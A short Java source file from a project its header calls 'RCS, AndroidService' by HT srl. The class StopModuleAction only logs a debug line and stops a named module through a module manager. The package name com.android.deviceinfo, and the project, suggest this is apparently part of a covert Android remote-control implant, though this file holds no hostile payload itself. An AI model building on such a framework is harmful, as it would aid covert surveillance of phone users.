/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StopAgentAction.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.action;

import com.android.deviceinfo.Trigger;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfAction;
import com.android.deviceinfo.manager.ManagerModule;
import com.android.deviceinfo.util.Check;

public class StopModuleAction extends ModuleAction {
	public StopModuleAction(ConfAction params) {
		super(params);
	}

	private static final String TAG = "StopAgentAction"; //$NON-NLS-1$

	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + moduleId);//$NON-NLS-1$
		}
		final ManagerModule moduleManager = ManagerModule.self();

		moduleManager.stop(moduleId);
		return true;
	}

}
